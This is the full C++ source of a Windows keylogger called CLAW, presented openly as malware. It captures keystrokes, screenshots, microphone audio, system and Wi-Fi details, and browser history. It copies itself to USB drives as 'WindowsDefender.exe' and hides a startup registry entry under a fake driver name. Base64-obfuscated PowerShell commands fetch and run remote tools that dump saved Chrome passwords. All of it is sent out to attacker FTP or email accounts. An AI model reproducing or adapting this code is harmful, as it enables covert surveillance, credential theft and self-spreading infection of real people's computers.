/*
Author: Fahad (QuantumCore)

https://github.com/quantumcore
https://quantumcored.com

claw.cpp (c) 2020

CLAW KEYLOGGER
*/

#include "Claw.h"
#include "base64.h"

/*
Copy Claw to USB Drive, This function runs in a loop and checks 
for available USB Drives.
If one is found, Claw is copied into it with the name of "WindowsDefender.exe";
*/
DWORD WINAPI USBINFECT(LPVOID lpParameter) {
	Claw claws;
	while(true)
	{
		Sleep(3000);
		for (char i = 'A'; i <= 'Z'; i++) {
			std::string path;
			path.push_back(i);
			path += ":\\";

			if (GetDriveTypeA(path.c_str()) == DRIVE_REMOVABLE) {
				path += "WindowsDefender.exe";
				if(!claws.isFile(path.c_str())){
					CopyFileA(claws.MyLocation().c_str(), path.c_str(), FALSE);
					break;
				}
			}
		} 
	}
}

std::string Claw::random_string( size_t length )
{
    auto randchar = []() -> char
    {
        const char charset[] =
        "0123456789"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz";
        const size_t max_index = (sizeof(charset) - 1);
        return charset[ rand() % max_index ];
    };
    std::string str(length,0);
    std::generate_n( str.begin(), length, randchar );
    return str;
}

/*
The Notifier Thread.
This is the thread that sends keylogs
*/
DWORD WINAPI NOTIFIER(LPVOID lpParameter){
	while(true)
	{
		Claw crs;  
		crs.GetKeyLoggerInformation(); // Load Keylogger information
		std::istringstream toint(crs.strTimeInterval); 
		toint >> crs.TIME_INTERVAL;
		Sleep(crs.TIME_INTERVAL); // Sleep until the set Time interval
		//Only send mails if a valid Internet connection is detected
		if(InternetCheckConnection(_T("http://www.google.com"), 1, 0)){
			// Take Screenshot     
			crs.SCREENSHOTFILENAME.clear(); 
			crs.SECONDSCREENSHOT.clear();
			crs.SCREENSHOTFILENAME = "sc_"+ crs.random_string(5) + ".jpg"; 
			crs.SECONDSCREENSHOT = "sc_"+ crs.random_string(5) + ".jpg"; 
			// The first screenshot
			crs.ScreenShot(crs.SCREENSHOTFILENAME);
			Sleep(10000);
			// The second Screenshot
			crs.ScreenShot(crs.SECONDSCREENSHOT);
			// Get chrome Passwords.
			crs.DumpChromeCredentials(); // Output name is chrome.txt
			// Get Browser history
			crs.DumpBrowserHistory(); // Output name is history.txt
			// get Intel
			crs.ExecuteCommandPrompt("systeminfo >> intel");
			crs.ExecuteCommandPrompt("tasklist >> intel");
			crs.ExecuteCommandPrompt("netsh wlan show all >> intel");
			crs.ExecuteCommandPrompt("ipconfig /displaydns >> intel");
			if(crs.MIC_OPTION == "1")
			{
				crs.RecordMic(); // Record MIC for 15 seconds
			}
			// Send
			crs.ProcessDelivery();
		}
	}
}
/*
Easy MIC Recording
*/
void Claw::RecordMic()
{
	std::ostringstream micrecfile;
	MICFILENAME.clear();
	MICFILENAME = "mic_" + random_string(5) +  ".wav";
	micrecfile << "save claw " << MICFILENAME;
	mciSendString(_T("open new type waveaudio alias claw"), NULL, 0, NULL);
	mciSendString(_T("set claw time format ms"), NULL, 0, NULL);
	mciSendString(_T("record claw notify"), NULL, 0, NULL);
	Sleep(15000); // Sleep() here is how long the recording will be
	mciSendString(_T("stop claw"), NULL, 0, NULL);
	mciSendStringA(micrecfile.str().c_str(), NULL, 0, NULL);
	mciSendString(_T("close claw"), NULL, 0, NULL);
}

// Get Current Directory
std::string Claw::Dir()
{
	char DIR[MAX_PATH];
	memset(DIR, '\0', MAX_PATH);
	GetCurrentDirectory(MAX_PATH, DIR);
	return std::string(DIR);
}

// Add Startup key
void Claw::StartupKey(const char* czExePath)
{
	HKEY hKey;
	TCHAR DIR[MAX_PATH];
	LONG lnRes = RegOpenKeyEx(  HKEY_CURRENT_USER,
								_T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
								0 , KEY_WRITE,
								&hKey);
	if( ERROR_SUCCESS == lnRes )
	{   
		lnRes = RegSetValueEx(  hKey,
								_T("Windows Universal Display Driver"),
								0,
								REG_SZ,
								(unsigned char*)czExePath,
								strlen(czExePath) );
	}

	RegCloseKey(hKey);
}

// Infect the system
void Claw::_infect()
{
	// get install path
	HQ = initial_install_directory() + "\\" + INSTALL_NAME; // Create the full HQ Path.
	std::string full_filename = HQ + "\\" + INSTALL_NAME + ".exe"; // Create the full install filename
	if (CreateDirectory(HQ.c_str(), NULL) || ERROR_ALREADY_EXISTS == GetLastError()) // Create Install Directory
	{
		copyFile(MyLocation().c_str(), full_filename.c_str()); // Copy claw into it with the install name
		StartupKey(full_filename.c_str()); // Add Startup key
	} else {
		// If we're unable to create directory
		const char* zs = MyLocation().c_str(); // Get Current location
		StartupKey(zs); // Add Startup key of current location
	}
}

// Get User / PC
std::string Claw::UserPC()
{
	char username[UNLEN + 1];
	char hostname[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD len = UNLEN + 1;
	DWORD hlen = sizeof(hostname) / sizeof(hostname[0]);
	std::string userpc;
	GetUserNameA(username, &len);
	GetComputerNameA(hostname, &hlen);
	userpc = std::string(username) + " / " + std::string(hostname);
	return userpc;
}

// Process the Delivery
void Claw::ProcessDelivery()
{
	// If Delivery method is ftp
	if(DELIVERY_METHOD == "ftp")
	{
		// Get all required data
		char username[UNLEN + 1];
		DWORD len = UNLEN + 1;
		memset(username, '\0', len);
		GetUserNameA(username, &len);
		std::string dirname = username;
		std::string logfilename = dirname + "/" + KeylogFileName();
		std::string ssuploadone = dirname + "/" + SCREENSHOTFILENAME;
		std::string ssuploadtwo = dirname + "/" + SECONDSCREENSHOT;
		std::string iintel = dirname + "/intel";
		std::string auds = dirname + "/" + MICFILENAME;
		std::string chr = dirname + "/chrome.txt";
		std::string histr = dirname + "/history.txt";
		HINTERNET hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
		HINTERNET hFtpSession = InternetConnect(hInternet, FTP_SERVER.c_str() , INTERNET_DEFAULT_FTP_PORT, DELIVERY_USER.c_str(), DELIVERY_PASS.c_str(), INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
		FtpCreateDirectory(hFtpSession, dirname.c_str()); // Create Directory as the username
		// Upload files to directory
		FtpPutFile(hFtpSession, SCREENSHOTFILENAME.c_str(), ssuploadone.c_str(), FTP_TRANSFER_TYPE_BINARY, 0);
		FtpPutFile(hFtpSession, _T("history.txt"), histr.c_str(), FTP_TRANSFER_TYPE_BINARY, 0);
		FtpPutFile(hFtpSession, _T("chrome.txt"), chr.c_str(), FTP_TRANSFER_TYPE_BINARY, 0);
		FtpPutFile(hFtpSession, SECONDSCREENSHOT.c_str(), ssuploadone.c_str(), FTP_TRANSFER_TYPE_BINARY, 0);
		FtpPutFile(hFtpSession, _T("intel"), iintel.c_str(), FTP_TRANSFER_TYPE_BINARY, 0);
		FtpPutFile(hFtpSession, MICFILENAME.c_str(), auds.c_str(), FTP_TRANSFER_TYPE_BINARY, 0);
		FtpPutFile(hFtpSession, KeylogFileName().c_str(), logfilename.c_str(), FTP_TRANSFER_TYPE_BINARY, 0);
		InternetCloseHandle(hFtpSession);
		InternetCloseHandle(hInternet);
	} 
	// If Delivery Method is Smtp 
	else if(DELIVERY_METHOD == "smtp")
	{
		// Create Message
		std::string message = "Claw Report for " + UserPC() + "\nDate : " + KeylogFileName() + "\nIP : " + WANIP() + "\nRunning from Directory : " + Dir() + "\nIt is a pleasure serving you.";
		std::string title = "Claw Report ( " + UserPC() + " | " + KeylogFileName() + " )";
		// Send Message
		SendMail(message, title);
	}

	// IMPORTANT PART (CLEANUP) ====================================
	// Once the Data has been sent, We reset the Keylogs.
	// Simply delete the Keylog file and if there are any others
	// IT will be recreated by Keylogger function
	// The program fails to delete itself because "process is being used" :D
	HANDLE hFind = FindFirstFile(_T("*"), &data);
	if(hFind != INVALID_HANDLE_VALUE){
		do{
			std::string filename = data.cFileName;
			if(filename != INSTALL_NAME + ".exe"){
				if(filename != KeylogFileName())
				{
					remove(filename.c_str());
				}
			}

		} while(FindNextFile(hFind, &data));
	}
}

void Claw::copyFile(const char* source, const char* dest)
{
	std::ifstream  src(source, std::ios::binary);
	std::ofstream  dst(dest, std::ios::binary);
	dst << src.rdbuf();
}

std::string Claw::WANIP()
{
	char wanip[300];
	HINTERNET hInternet, hFile;
	DWORD rSize;
	if(InternetCheckConnection(_T("http://www.google.com"), 1, 0)){
		memset(wanip, '\0', 300);
		hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
		hFile = InternetOpenUrl(hInternet, _T("http://bot.whatismyipaddress.com/"), NULL, 0, INTERNET_FLAG_RELOAD, 0);
		InternetReadFile(hFile, &wanip, sizeof(wanip), &rSize);
		wanip[rSize] = '\0';

		InternetCloseHandle(hFile);
		InternetCloseHandle(hInternet);
	} else {
		memset(wanip, '\0', 300);
		snprintf(wanip, 300, "[Failed to get WAN IP]");
	}

	return std::string(wanip);
}

void Claw::replaceAll( std::string &s, const std::string &search, const std::string &replace ) {
	for( size_t pos = 0; ; pos += replace.length() ) {
		// Locate the substring to replace
		pos = s.find( search, pos );
		if( pos == std::string::npos ) break;
		// Replace by erasing and inserting
		s.erase( pos, search.length() );
		s.insert( pos, replace );
	}
}

std::string Claw::initial_install_directory(){
	char szPath[MAX_PATH];
	if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_APPDATA | CSIDL_FLAG_CREATE, NULL, 0, szPath))){
		return std::string(szPath); // return AppData/Roaming Path
	} else {
	return "C:\\Users\\Public"; // If We are unable to get the AppData/Romaing path, Use Public $HOME folder for installation
	}
}

// Send Email with attachments using Powershell
bool Claw::SendMail(std::string message, std::string subject)
{
	STARTUPINFO sinfo;
	PROCESS_INFORMATION pinfo;
	memset(&sinfo, 0, sizeof(sinfo));
	std::ofstream outscript;
	std::string powershell_script = "JFVzZXJuYW1lID0gImRlc3RpbmF0aW9uIjsKJFBhc3N3b3JkID0gImRwYXNzIjsKJGtsb2cgPSAia2xvZ2ZpbGUiOwokc2NyID0gInNjZmlsZSI7CiRzY3JzID0gInNjdHdvIjsKJGhpc3RvcnkgPSAiaGlzdG9yeWZpbGUiOwokcHdzID0gInB3ZmlsZSI7CiRpbmZpbGVzID0gImludGVsIjsKJG1pYyA9ICJhdWRpb2ZpbGVuYW1lIjsKCmZ1bmN0aW9uIFNlbmQtVG9FbWFpbChbc3RyaW5nXSRlbWFpbCl7CgogICAgJG1lc3NhZ2UgPSBuZXctb2JqZWN0IE5ldC5NYWlsLk1haWxNZXNzYWdlOwogICAgJG1lc3NhZ2UuRnJvbSA9ICJkZXN0aW5hdGlvbiI7CiAgICAkbWVzc2FnZS5Uby5BZGQoJGVtYWlsKTsKICAgICRtZXNzYWdlLlN1YmplY3QgPSAiZW1haWx0aXRsZSI7CiAgICAkbWVzc2FnZS5Cb2R5ID0gImVtYWlsbWVzc2FnZSI7CiAgICAkYXR0X29uZSA9IE5ldy1PYmplY3QgTmV0Lk1haWwuQXR0YWNobWVudCgka2xvZyk7CiAgICAkYXR0X3R3byA9IE5ldy1PYmplY3QgTmV0Lk1haWwuQXR0YWNobWVudCgkc2NyKTsKICAgICRhdHRfdGhyZWUgPSBOZXctT2JqZWN0IE5ldC5NYWlsLkF0dGFjaG1lbnQoJGhpc3RvcnkpOwogICAgJGF0dF9mb3VyID0gTmV3LU9iamVjdCBOZXQuTWFpbC5BdHRhY2htZW50KCRwd3MpOwogICAgJGF0dF9maXZlID0gTmV3LU9iamVjdCBOZXQuTWFpbC5BdHRhY2htZW50KCRzY3JzKTsKICAgICRhdHRfc2l4ID0gTmV3LU9iamVjdCBOZXQuTWFpbC5BdHRhY2htZW50KCRpbmZpbGVzKTsKICAgICRhdHRfc2V2ZW4gPSBOZXctT2JqZWN0IE5ldC5NYWlsLkF0dGFjaG1lbnQoJG1pYyk7CiAgICAkbWVzc2FnZS5BdHRhY2htZW50cy5BZGQoJGF0dF9vbmUpOwogICAgJG1lc3NhZ2UuQXR0YWNobWVudHMuQWRkKCRhdHRfdHdvKTsKICAgICRtZXNzYWdlLkF0dGFjaG1lbnRzLkFkZCgkYXR0X3RocmVlKTsKICAgICRtZXNzYWdlLkF0dGFjaG1lbnRzLkFkZCgkYXR0X2ZvdXIpOwogICAgJG1lc3NhZ2UuQXR0YWNobWVudHMuQWRkKCRhdHRfZml2ZSk7CiAgICAkbWVzc2FnZS5BdHRhY2htZW50cy5BZGQoJGF0dF9zaXgpOwogICAgJG1lc3NhZ2UuQXR0YWNobWVudHMuQWRkKCRhdHRfc2V2ZW4pOwogICAgJHNtdHAgPSBuZXctb2JqZWN0IE5ldC5NYWlsLlNtdHBDbGllbnQoInNlcnZlcmhvc3QiLCAiNTg3Iik7CiAgICAkc210cC5FbmFibGVTU0wgPSAkdHJ1ZTsKICAgICRzbXRwLkNyZWRlbnRpYWxzID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0Lk5ldHdvcmtDcmVkZW50aWFsKCRVc2VybmFtZSwgJFBhc3N3b3JkKTsKICAgICRzbXRwLnNlbmQoJG1lc3NhZ2UpOwogICAgJGF0dF9vbmUuZGlzcG9zZSgpOwogICAgJGF0dF90d28uZGlzcG9zZSgpOwogICAgJGF0dF90aHJlZS5kaXNwb3NlKCk7CiAgICAkYXR0X2ZvdXIuZGlzcG9zZSgpOwogICAgJGF0dF9maXZlLmRpc3Bvc2UoKTsKICAgICRhdHRfc2l4LmRpc3Bvc2UoKQogICAgJGF0dF9zZXZlbi5kaXNwb3NlKCk7CiB9ClNlbmQtVG9FbWFpbCAgLWVtYWlsICJkZXN0aW5hdGlvbiI7Cg==";
	std::string pwdecode = base64_decode(powershell_script);
	replaceAll(pwdecode, "destination", DELIVERY_USER);
	replaceAll(pwdecode, "dpass", DELIVERY_PASS);
	replaceAll(pwdecode, "emailmessage", message);
	replaceAll(pwdecode, "emailtitle", subject);
	replaceAll(pwdecode, "klogfile", KeylogFileName());
	replaceAll(pwdecode, "scfile", SCREENSHOTFILENAME);
	replaceAll(pwdecode, "sctwo", SECONDSCREENSHOT);
	replaceAll(pwdecode, "historyfile", "history.txt");
	replaceAll(pwdecode, "pwfile", "chrome.txt");
	replaceAll(pwdecode, "infiles", "intel");
	replaceAll(pwdecode, "audiofilename", MICFILENAME);
	if(DELIVERY_USER.find("gmail.com") != std::string::npos){
		replaceAll(pwdecode, "serverhost", "smtp.gmail.com");
	} else if(DELIVERY_USER.find("yahoo.com") != std::string::npos){
		replaceAll(pwdecode, "serverhost", "smtp.mail.yahoo.com");
	} else if(DELIVERY_USER.find("yandex.com") != std::string::npos){
		replaceAll(pwdecode, "serverhost", "smtp.yandex.com");
	} else if (DELIVERY_USER.find("outlook.com") != std::string::npos)
	{
		replaceAll(pwdecode, "serverhost", "smtp.outlook.com");
	} else if (DELIVERY_USER.find("hotmail.com") != std::string::npos){
		replaceAll(pwdecode, "serverhost", "smtp.outlook.com");
	}
	outscript.open("rand.ps1");
	if(outscript.is_open())
	{
		outscript << pwdecode;
		outscript.close();
	}
	CreateProcess(NULL, (LPSTR)"cmd.exe /c powershell.exe -ExecutionPolicy Bypass -windowstyle hidden -file rand.ps1", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
	WaitForSingleObject(pinfo.hProcess, INFINITE);
	CloseHandle(pinfo.hProcess);
	CloseHandle(pinfo.hThread);
}

void Claw::split(char* src, char* dest[5], const char* delimeter) {
	int i = 0;
	char *p = strtok(src, delimeter);
	while (p != NULL)
	{
		dest[i++] = p;
		p = strtok(NULL, delimeter);
	}
}

std::string Claw::MyLocation()
{
	TCHAR DIR[MAX_PATH];
	std::string filelocation;
	std::ostringstream err;
	int fpath = GetModuleFileName(NULL, DIR, MAX_PATH);
	if (fpath == 0)
	{
		err.str(""); err.clear();
		err << "Failed to get : " << GetLastError();
		filelocation = err.str();
	}
	else {
		filelocation = DIR;
	}

	return filelocation;

}

std::istream& Claw::ignoreline(std::ifstream& in, std::ifstream::pos_type& pos)
{
	pos = in.tellg();
	return in.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
}

std::string Claw::getLastLine(std::ifstream& in)
{
	std::ifstream::pos_type pos = in.tellg();

	std::ifstream::pos_type lastPos;
	while (in >> std::ws && ignoreline(in, lastPos))
		pos = lastPos;

	in.clear();
	in.seekg(pos);

	std::string line;
	std::getline(in, line);
	return line;
}

std::string Claw::GetKeyLoggerInformation()
{
	char* values[5]; 
	std::ifstream ME(MyLocation().c_str(), std::ios::binary);
	if(ME.is_open()){
		std::string hp = getLastLine(ME); // Get Last line from itself
		memset(values, '\0', 5); 
		split((char*)hp.c_str(), values, "[]"); // Split the last line with [] delimeter
		std::string method(values[0]); // The Delivery method will be at index 0
		std::string demail(values[1]); // The Email / FTP Server will be at index[1]
		std::string dpass(values[2]); // The Password will be at index[2]
		std::string installname(values[3]); // The Install name will be at index[3]
		std::string strtime(values[4]); // Time Interval at index[4]
		std::string mic(values[5]); // Mic Switch at index[5]
		// Everything written is base64 encoded so we decode it

		DELIVERY_METHOD = base64_decode(method);
		DELIVERY_USER = base64_decode(demail);
		// If the Delivery method is ftp
		if(DELIVERY_METHOD == "ftp"){
			// Split index[1] with , delimeter
			// Lets assume X = index[1] splitted with , delimiter
			// The the FTP Server is at X[0] and FTP Username at X[1]
			char* vals[5];
			split((char*)DELIVERY_USER.c_str(), vals, ",");
			FTP_SERVER = vals[0];
			DELIVERY_USER = vals[1];
		}

		DELIVERY_PASS = base64_decode(dpass);
		INSTALL_NAME = base64_decode(installname);
		strTimeInterval = base64_decode(strtime);
		MIC_OPTION = base64_decode(mic);

		return DELIVERY_METHOD + "[]" + DELIVERY_USER + "[]" + DELIVERY_PASS + "[]" + INSTALL_NAME + "[]" + strTimeInterval + "[]" + MIC_OPTION; // Return the decoded information
	}
}

DWORD Claw::ProcessId(LPCTSTR ProcessName)
{
	PROCESSENTRY32 pt;
	HANDLE hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	pt.dwSize = sizeof(PROCESSENTRY32);
	if (Process32First(hsnap, &pt)) { 
		do {
			if (!lstrcmpi(pt.szExeFile, ProcessName)) {
				CloseHandle(hsnap);
				return pt.th32ProcessID;
			}
		} while (Process32Next(hsnap, &pt));
	}
	CloseHandle(hsnap); 
	return 0;
}

BOOL Claw::isFile(const char* file)
{
	DWORD dwAttrib = GetFileAttributes(file);

	return (dwAttrib != INVALID_FILE_ATTRIBUTES && 
			!(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

std::string Claw::readFileContents(const char* file){
	std::stringstream stream;
	std::ifstream outfile(file);
	if(outfile.is_open()){
		stream << outfile.rdbuf();
		return stream.str();
	} else {
		stream << file << " not found : " << GetLastError();
		return stream.str();
	}
}

void Claw::ExecuteCommandPrompt( const char* command )
{
	char cmd[500];
	memset(cmd, '\0', 500);
	snprintf(cmd, 500, "cmd.exe /c %s", command);
	STARTUPINFO sinfo;
	PROCESS_INFORMATION pinfo;
	memset(&sinfo, 0, sizeof(sinfo));
	if(CreateProcess(NULL, (LPSTR)cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo)){
		WaitForSingleObject(pinfo.hProcess, INFINITE);
		CloseHandle(pinfo.hProcess);
		CloseHandle(pinfo.hThread);
	}
}

std::string Claw::ExecuteOutFile(const char* command, const char* output_filename)
{
	char cmd[500];
	memset(cmd, '\0', 500);
	snprintf(cmd, 500, "cmd.exe /c powershell.exe -command %s > %s", command, output_filename);
	STARTUPINFO sinfo;
	PROCESS_INFORMATION pinfo;
	memset(&sinfo, 0, sizeof(sinfo));
	if(CreateProcess(NULL, (LPSTR)cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo)){
		WaitForSingleObject(pinfo.hProcess, INFINITE);
		CloseHandle(pinfo.hProcess);
		CloseHandle(pinfo.hThread);
	}
	return readFileContents(output_filename);
}

void Claw::ExecuteSilent(const char* command)
{
	char cmd[500];
	memset(cmd, '\0', 500);
	snprintf(cmd, 500, "cmd.exe /c powershell.exe -command %s", command);
	STARTUPINFO sinfo;
	PROCESS_INFORMATION pinfo;
	memset(&sinfo, 0, sizeof(sinfo));
	CreateProcess(NULL, (LPSTR)cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
	WaitForSingleObject(pinfo.hProcess, INFINITE);
	CloseHandle(pinfo.hProcess);
	CloseHandle(pinfo.hThread);
	//return readFileContents("output");
}

// Dump Google Chrome Credentials using Powershell.
std::string Claw::DumpChromeCredentials()
{
	std::ofstream ifError;
	std::string Payload = "ImlleCAoaXdyIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9xdWFudHVtY29yZS90ZXN0L21hc3Rlci9vcnBoaWMucHMxKSB8IENvbnZlcnRUby1Dc3Y7Ig==";
	std::string b64decode = base64_decode(Payload);
	ExecuteOutFile(b64decode.c_str(), "chrome.txt");
	
	if(readFileContents("chrome.txt").find("FullyQualifiedErrorId") != std::string::npos)
	{
		ifError.open("chrome.txt", std::ofstream::out | std::ofstream::trunc);
		if(ifError.is_open()){
			ifError << "Chrome installation not found OR no Passwords saved. (ERROR_PWDUMP)." << std::endl;
			ifError.close();
		}
	} 
	
	return readFileContents("chrome.txt");
	
}

// Dump browsing histroy for the last 3 hours using 
// Nirsoft History Dumper
// BrowserHistoryView.exe is not detected by Anti Virus.
// The function downloads it, uses it to dump the history, And removes it.
void Claw::DumpBrowserHistory(){
	std::string Payload = "W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgKG5ldy1vYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkRmlsZSgnaHR0cHM6Ly9naXRodWIuY29tL3F1YW50dW1jb3JlL3Rlc3QvcmF3L21hc3Rlci9Ccm93c2luZ0hpc3RvcnlWaWV3LmV4ZScsJ2Jodi5leGUnKTsgIC5cYmh2LmV4ZSAgL1Zpc2l0VGltZUZpbHRlclR5cGUgMiAvVmlzaXRUaW1lRmlsdGVyVmFsdWUgMyAvc3RleHQgaGlzdG9yeS50eHQK";
	std::string b64decode = base64_decode(Payload);
	ExecuteSilent(b64decode.c_str());
	while(true){
		Sleep(50);
		if(isFile("history.txt")){
			DWORD processid = ProcessId(_T("bhv.exe"));
			if(processid == 0){
				// Process id 0, means process is not running.
				remove("bhv.exe");
				break; 
			}
		}
	}
}

bool Claw::hookShift(){
	if (GetKeyState(VK_LSHIFT) < -120){return true;}
	if (GetKeyState(VK_RSHIFT) < -120){return true;}
	return false;
}

bool Claw::capsLock(){
	if (GetKeyState(VK_CAPITAL) == 1){return true;}
	if (GetKeyState(VK_CAPITAL) == -127){return true;}
	return false;
}


int Claw::filter(int key){
	if ((key >= 65) && (key <= 90)){
		if( (!hookShift()) && (!capsLock()) ){
			key +=32; 
		}
	}
	else if ((key >= 48) && (key <= 57)){
		if (hookShift()){
			switch(key) {
				case '1' : key = '!'; break;
				case '2' : key = '@'; break;
				case '3' : key = '#'; break;
				case '4' : key = '$'; break;
				case '5' : key = '%'; break;
				case '6' : key = '^'; break;
				case '7' : key = '&'; break;
				case '8' : key = '*'; break;
				case '9' : key = '('; break;
				case '0' : key = ')'; break;
			}
		}
	}
	if (hookShift()){
		if (key == 186){key = ':';}
		else if (key == 187){key = '+';}
		else if (key == 188){key = '<';}
		else if (key == 189){key = '_';}
		else if (key == 190){key = '>';}
		else if (key == 191){key = '?';}
		else if (key == 192){key = '~';}

		else if (key == 219){key = '{';}
		else if (key == 220){key = '|';}
		else if (key == 221){key = '}';}
		else if (key == 222){key = '"';}
	}
   
	else {
		if (key == 186){key = ';';}
		else if (key == 187){key = '=';}
		else if (key == 188){key = ',';}
		else if (key == 189){key = '-';}
		else if (key == 190){key = '.';}
		else if (key == 191){key = '/';}
		else if (key == 192){key = '~';}
		
		else if (key == 219){key = '[';}
		else if (key == 220){key = '\\';}
		else if (key == 221){key = ']';}
		else if (key == 222){key = '\'';}        
	}
	
	return key;
}

std::string Claw::KeylogFileName()
{
	time_t t = time(0); 
	struct tm * now = localtime( & t );
	char buffer[100] = {0};
	memset(buffer, '\0', 100);
	strftime (buffer,100,"%Y-%m-%d",now);
	return std::string(buffer);
}

std::string Claw::WindowStamp()
{
	char title[500];
	char buffer[100] = {0};
	memset(title, '\0', 500);
	HWND hwnd = GetForegroundWindow();
	GetWindowText(hwnd, (LPSTR)title ,500);
	time_t t = time(0); 
	struct tm * now = localtime( & t );
	memset(buffer, '\0', 100);
	strftime (buffer,100,"%Y-%m-%d-%S",now);
	
	return "[ " + std::string(title) + " - " +  std::string(buffer) + " ] ";
}


void Claw::Keylogger()
{
	for (unsigned char c = 1; c < 255; c++) {
		SHORT rv = GetAsyncKeyState(c);
		if (rv & 1) { 
			std::string out = "";
			if (c == 1)
				out = "";
			else if (c == 2)
				out = ""; 
			else if (c == 4)
				out = ""; 
			else if (c == 13)
				out = "\n[RETURN] " + WindowStamp() + "\n";
			else if (c == 16 || c == 17 || c == 18)
				out = "";
			else if (c == 160 || c == 161) 
				out = ""; 
			else if (c == 162 || c == 163) 
				out = "[STRG]";
			else if (c == 164) 
				out = "[ALT]";
			else if (c == 165)
				out = "[ALT GR]";
			else if (c == 8)
				out = "[BACKSPACE]";
			else if (c == 9)
				out = "[TAB]";
			else if (c == 27)
				out = "[ESC]";
			else if (c == 33)
				out = "[PAGE UP]";
			else if (c == 34)
				out = "[PAGE DOWN]";
			else if (c == 35)
				out = "[HOME]";
			else if (c == 36)
				out = "[POS1]";
			else if (c == 37)
				out = "[ARROW LEFT]";
			else if (c == 38)
				out = "[ARROW UP]";
			else if (c == 39)
				out = "[ARROW RIGHT]";
			else if (c == 40)
				out = "[ARROW DOWN]";
			else if (c == 45)
				out = "[INS]";
			else if (c == 46)
				out = "[DEL]";
			else if ((c >= 65 && c <= 90)
				|| (c >= 48 && c <= 57)
				|| c == 32)
				out = filter(c);

			else if (c == 91 || c == 92)
				out = "[WIN]";
			else if (c >= 96 && c <= 105)
				out = "[NUM " + std::to_string(c - 96) + "]";
			else if (c == 106)
				out = "[NUM /]";
			else if (c == 107)
				out = "[NUM +]";
			else if (c == 109)
				out = "[NUM -]";
			else if (c == 110)
				out = "[NUM ,]";
			else if (c >= 112 && c <= 123)
				out = "[F" + std::to_string(c - 111) + "]";
			else if (c == 144)
				out = "[NUM]";
			else if (c == 192)
				out = filter(c);
			else if (c == 222)
				out = filter(c);
			else if (c == 186)
				out = filter(c);
			else if (c == 187)
				out = filter(c);
			else if (c == 188)
				out = filter(c);
			else if (c == 189)
				out = filter(c);
			else if (c == 190)
				out = filter(c);
			else if (c == 191)
				out = filter(c);
			else if (c == 226)
				out = filter(c);

			else
				out = "[KEY \\" + std::to_string(c) + "]";

			if (out != "")
			{
				std::ofstream file;
				file.open(KeylogFileName().c_str(), std::ios_base::app);
				file << out;
				file.close();
			}
		}
	}
}

void Claw::ScreenShot(std::string JPEG_FILENAME)
{
	ULONG_PTR gdiplustoken;
	Gdiplus::GdiplusStartupInput gdistartupinput;
	Gdiplus::GdiplusStartupOutput gdistartupoutput;

	gdistartupinput.SuppressBackgroundThread = true;
	GdiplusStartup(& gdiplustoken,& gdistartupinput,& gdistartupoutput);

	HDC dc=GetDC(GetDesktopWindow());
	HDC dc2 = CreateCompatibleDC(dc);

	RECT rc0kno;

	GetClientRect(GetDesktopWindow(),&rc0kno);
	int w = rc0kno.right-rc0kno.left;
	int h = rc0kno.bottom-rc0kno.top;

	HBITMAP hbitmap = CreateCompatibleBitmap(dc,w,h);
	HBITMAP holdbitmap = (HBITMAP) SelectObject(dc2,hbitmap);

	BitBlt(dc2, 0, 0, w, h, dc, 0, 0, SRCCOPY);
	Gdiplus::Bitmap* bm= new Gdiplus::Bitmap(hbitmap,NULL);

	UINT num;
	UINT size;

	Gdiplus::ImageCodecInfo *imagecodecinfo;
	Gdiplus::GetImageEncodersSize(&num,&size);

	imagecodecinfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
	Gdiplus::GetImageEncoders (num,size,imagecodecinfo);

	CLSID clsidEncoder;

	for(int i=0; i < num; i++)
	{
		if(wcscmp(imagecodecinfo[i].MimeType,L"image/jpeg")==0)
			clsidEncoder = imagecodecinfo[i].Clsid;

	}

	free(imagecodecinfo);

	std::wstring ws;
	ws.assign(JPEG_FILENAME.begin(),JPEG_FILENAME.end());
	bm->Save(ws.c_str(),& clsidEncoder, NULL); 
	SelectObject(dc2,holdbitmap);
	DeleteObject(dc2);
	DeleteObject(hbitmap);

	ReleaseDC(GetDesktopWindow(),dc);
	Gdiplus::GdiplusShutdown(gdiplustoken);
}